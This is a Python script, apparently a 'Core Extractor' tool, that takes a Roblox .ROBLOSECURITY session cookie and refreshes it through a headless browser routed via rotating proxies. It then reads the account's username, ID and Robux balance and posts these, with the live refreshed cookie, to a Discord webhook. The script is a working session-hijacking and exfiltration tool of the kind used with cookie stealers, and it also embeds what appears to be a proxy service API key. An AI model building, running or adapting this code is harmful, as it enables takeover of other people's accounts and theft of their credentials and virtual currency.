import os
import sys
import random
import requests
from playwright.sync_api import sync_playwright

WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")

# Your Webshare proxy list download link
PROXY_DOWNLOAD_URL = "https://proxy.webshare.io/api/v2/proxy/list/download/uzgeapqarausasypqpyowjvkqdyohtkelyldsmup/-/any/username/direct/-/?plan_id=14633200"

def get_random_proxy():
    try:
        print("[+] Fetching proxies from Webshare link...")
        res = requests.get(PROXY_DOWNLOAD_URL, timeout=10)
        if res.status_code == 200:
            lines = [line.strip() for line in res.text.splitlines() if line.strip()]
            if lines:
                proxy_line = random.choice(lines)
                parts = proxy_line.split(":")
                
                # Standard Webshare format: IP:PORT:USERNAME:PASSWORD
                if len(parts) == 4:
                    ip, port, user, pwd = parts
                    return {
                        "server": f"http://{ip}:{port}",
                        "username": user,
                        "password": pwd,
                        "auth_server": f"http://{user}:{pwd}@{ip}:{port}"
                    }
                # Unauthenticated format: IP:PORT
                elif len(parts) == 2:
                    ip, port = parts
                    return {
                        "server": f"http://{ip}:{port}",
                        "auth_server": f"http://{ip}:{port}"
                    }
        print("[-] Could not parse proxies from list, running without proxy.")
    except Exception as e:
        print(f"[-] Error fetching proxy list: {e}")
    return None

def send_to_discord_embed(username, user_id, robux, refreshed_cookie):
    if not WEBHOOK_URL:
        print("[-] Discord webhook URL not set!")
        return
        
    embed = {
        "title": "🎯 Core Extractor — Account Logged & Refreshed",
        "color": 5814783,
        "fields": [
            {"name": "👤 Username", "value": f"`{username}`", "inline": True},
            {"name": "🆔 User ID", "value": f"`{user_id}`", "inline": True},
            {"name": "💰 Robux", "value": f"`{robux}`", "inline": True},
            {"name": "🔑 Refreshed Cookie", "value": f"```json\n{refreshed_cookie}\n```", "inline": False}
        ],
        "footer": {"text": "Core Extractor Automation • Secured Session"}
    }
    
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"[-] Failed to send to Discord: {e}")

def extract_and_refresh(cookie_value):
    print("[+] Starting Roblox session extraction & cookie refresh...")
    
    # Fetch a live proxy from Webshare automatically
    proxy_info = get_random_proxy()
    
    with sync_playwright() as p:
        launch_args = {}
        if proxy_info:
            print(f"[+] Using Proxy Server: {proxy_info['server']}")
            launch_args["proxy"] = {
                "server": proxy_info["server"],
            }
            if "username" in proxy_info:
                launch_args["proxy"]["username"] = proxy_info["username"]
                launch_args["proxy"]["password"] = proxy_info["password"]
            
        browser = p.chromium.launch(headless=True, **launch_args)
        context = browser.new_context()
        
        # Inject the provided cookie
        context.add_cookies([{
            'name': '.ROBLOSECURITY',
            'value': cookie_value,
            'domain': '.roblox.com',
            'path': '/',
            'httpOnly': True,
            'secure': True
        }])
        
        page = context.new_page()
        
        try:
            print("[+] Connecting to Roblox to refresh token...")
            page.goto("https://www.roblox.com/home", timeout=60000)
            
            # Check if the cookie is dead
            if "login" in page.url or page.locator("#login-button").count() > 0:
                print("[-] Cookie is invalid or expired.")
                requests.post(WEBHOOK_URL, json={"content": "⚠️ **Core Extractor:** Failed — Provided cookie is dead or expired."})
                browser.close()
                return

            # Grab the updated/refreshed .ROBLOSECURITY cookie
            cookies = context.cookies()
            refreshed_cookie = None
            for cookie in cookies:
                if cookie['name'] == '.ROBLOSECURITY':
                    refreshed_cookie = cookie['value']
                    break
            
            # Setup requests session with proxy support
            session = requests.Session()
            if proxy_info:
                session.proxies = {
                    "http": proxy_info["auth_server"],
                    "https": proxy_info["auth_server"]
                }
                
            session.cookies.set('.ROBLOSECURITY', refreshed_cookie, domain='.roblox.com')
            
            # Get user info
            print("[+] Fetching account details...")
            user_info_res = session.get("https://users.roblox.com/v1/users/authenticated")
            if user_info_res.status_code == 200:
                user_data = user_info_res.json()
                user_id = user_data.get("id")
                username = user_data.get("name")
                
                # Get Robux balance
                robux_res = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency")
                robux = robux_res.json().get("robux", 0) if robux_res.status_code == 200 else "Unknown"
                
                send_to_discord_embed(username, user_id, robux, refreshed_cookie)
                print("[+] Successfully refreshed cookie, extracted stats, and sent embed to Discord!")
            else:
                print("[-] Failed to authenticate user data endpoint.")
                requests.post(WEBHOOK_URL, json={"content": "⚠️ **Core Extractor:** Refreshed session, but failed to fetch user stats."})
                
        except Exception as e:
            print(f"[-] Error during execution: {e}")
            requests.post(WEBHOOK_URL, json={"content": f"❌ **Error:** {str(e)}"})
            
        browser.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python core_extractor.py 'YOUR_ROBLOX_COOKIE'")
        sys.exit(1)
        
    target_cookie = sys.argv[1]
    extract_and_refresh(target_cookie)
